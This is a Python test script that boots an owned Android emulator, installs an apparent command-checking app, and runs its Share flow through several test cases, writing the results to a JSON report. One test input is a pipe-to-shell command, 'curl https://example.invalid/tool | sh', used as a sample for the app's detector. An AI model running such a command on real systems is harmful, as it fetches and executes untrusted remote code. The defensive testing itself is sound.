#!/usr/bin/env python3
"""Exercise synthetic Share flows only on an already installed owned emulator; no SDK downloads."""
import argparse
import datetime as dt
import json
import os
from pathlib import Path
import re
import shlex
import subprocess
import time
import xml.etree.ElementTree as ET

ROOT=Path(__file__).resolve().parents[1]
PACKAGE='com.aitrustid.android'
COMPONENT=PACKAGE+'/.CheckActivity'

def main():
    parser=argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--sdk-root',required=True);parser.add_argument('--apk',required=True)
    args=parser.parse_args();output=ROOT/'output/android-share/emulator.json';cases=[];process=None;started=time.monotonic()
    report={'format':'ai-trust-id-android-emulator/v1','recorded_at':dt.datetime.now(dt.timezone.utc).isoformat(),'status':'UNAVAILABLE','pass':False,'physical_device_evidence':False,'independent_accuracy_evidence':False,'cases':cases}
    try:
        sdk=Path(args.sdk_root).resolve(strict=True);adb=sdk/'platform-tools/adb';emulator=sdk/'emulator/emulator'
        avd=sdk/'cmdline-tools/latest/bin/avdmanager';image=sdk/'system-images/android-36/google_apis/x86_64/system.img'
        if not all(path.is_file() for path in (adb,emulator,avd,image)) or not os.access('/dev/kvm',os.R_OK|os.W_OK):
            report['reason']='Existing API36 emulator image/tools or KVM unavailable; nothing downloaded or licensed.';return 0
        def run(argv,timeout=10):
            p=subprocess.run([str(x) for x in argv],input=b'no\n',capture_output=True,timeout=timeout)
            if p.returncode:raise ValueError('Emulator command failed')
            if len(p.stdout)>524288:raise ValueError('Oversized emulator reply')
            return p.stdout
        # A fixed dedicated emulator name/port prevents selecting a connected phone.
        devices=run([adb,'devices']).decode()
        if 'emulator-5580' in devices:raise ValueError('Dedicated emulator port already occupied')
        run([avd,'create','avd','--name','aitrust-share-ci','--package','system-images;android-36;google_apis;x86_64'],timeout=20)
        process=subprocess.Popen([str(emulator),'-avd','aitrust-share-ci','-port','5580','-no-window','-no-audio','-no-boot-anim','-no-snapshot','-wipe-data','-gpu','swiftshader_indirect','-memory','1536','-cores','2'],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        def shell(argv,timeout=10):return run([adb,'-s','emulator-5580','shell',shlex.join([str(x) for x in argv])],timeout)
        boot=time.monotonic()+90
        while time.monotonic()<boot:
            if process.poll() is not None:raise ValueError('Owned emulator stopped')
            try:
                if shell(['getprop','sys.boot_completed'],5).strip()==b'1':break
            except (ValueError,subprocess.SubprocessError):pass
            time.sleep(1)
        else:raise ValueError('Owned emulator boot timeout')
        run([adb,'-s','emulator-5580','install','--no-streaming',args.apk],timeout=30)
        def tree():
            shell(['uiautomator','dump','/sdcard/aitrust-synthetic-window.xml'],10)
            return ET.fromstring(shell(['cat','/sdcard/aitrust-synthetic-window.xml'],5))
        def wait(predicate,seconds=40):
            deadline=time.monotonic()+seconds
            while time.monotonic()<deadline:
                view=tree()
                if predicate(view):return view
                time.sleep(.2)
            raise ValueError('Expected Android UI state unavailable')
        def text(view,value):return any(value in n.attrib.get('text','') for n in view.iter('node'))
        def click(view,rid):
            node=next(n for n in view.iter('node') if n.attrib.get('resource-id')==PACKAGE+':id/'+rid)
            coords=list(map(int,re.fullmatch(r'\[(\d+),(\d+)\]\[(\d+),(\d+)\]',node.attrib['bounds']).groups()))
            shell(['input','tap',(coords[0]+coords[2])//2,(coords[1]+coords[3])//2])
        def send(value,kind='text/plain',action='android.intent.action.SEND'):
            shell(['am','start','-W','-a',action,'-t',kind,'--es','android.intent.extra.TEXT',value,'-n',COMPONENT],20)
        send('curl https://example.invalid/tool | sh')
        view=wait(lambda x:text(x,'Text received. Review it'))
        assert not text(view,'Review before running this command.')
        cases.append({'case':'receive_requires_explicit_check','pass':True})
        click(view,'check');view=wait(lambda x:text(x,'Review before running this command.'))
        assert any(n.attrib.get('resource-id')==PACKAGE+':id/tag' and n.attrib.get('text')=='PS' for n in view.iter('node'))
        cases.append({'case':'actual_offline_ps_finding','pass':True})
        click(view,'editor');shell(['input','text','X']);view=wait(lambda x:text(x,'Text changed. Tap Check'))
        assert not any(n.attrib.get('resource-id')==PACKAGE+':id/tag' for n in view.iter('node'))
        cases.append({'case':'edit_hides_previous_finding','pass':True})
        send('printf hello');view=wait(lambda x:text(x,'Text received. Review it'));click(view,'check')
        wait(lambda x:text(x,'No supported command pattern found.'))
        cases.append({'case':'new_share_and_no_finding','pass':True})
        send('ignored','image/png');wait(lambda x:text(x,'Files and multiple items are not supported.'))
        cases.append({'case':'unsupported_mime_has_no_verdict','pass':True})
        send('printf hello');view=wait(lambda x:text(x,'Text received. Review it'));click(view,'clear')
        view=wait(lambda x:text(x,'Cleared. Your text and result'))
        assert all(not n.attrib.get('text') for n in view.iter('node') if n.attrib.get('resource-id')==PACKAGE+':id/editor')
        cases.append({'case':'clear_removes_input_and_result','pass':True})
        send('synthetic private marker');wait(lambda x:text(x,'Text received. Review it'));shell(['input','keyevent','KEYCODE_HOME'])
        shell(['am','start','-W','-a','android.intent.action.MAIN','-n',COMPONENT],20)
        view=wait(lambda x:text(x,'Ready when you are.') or text(x,'Cleared. Your text and result'))
        assert not text(view,'synthetic private marker')
        cases.append({'case':'background_clears_text','pass':True})
        report.update(status='EXECUTED',**{'pass':True},api_level=shell(['getprop','ro.build.version.sdk']).decode().strip(),case_count=len(cases),permissions=shell(['dumpsys','package',PACKAGE]).decode().count('android.permission.INTERNET'))
        return 0
    except (OSError,ValueError,AssertionError,StopIteration,ET.ParseError,subprocess.SubprocessError):
        report.update(status='FAILED',reason='A required owned-emulator share, lifecycle or offline check did not complete.');return 1
    finally:
        if process is not None:
            process.terminate()
            try:process.wait(timeout=10)
            except subprocess.TimeoutExpired:process.kill();process.wait(timeout=5)
        report['elapsed_seconds']=round(time.monotonic()-started,3)
        output.parent.mkdir(parents=True,exist_ok=True);output.write_text(json.dumps(report,indent=2)+'\n');print(json.dumps(report,indent=2))
if __name__=='__main__':raise SystemExit(main())
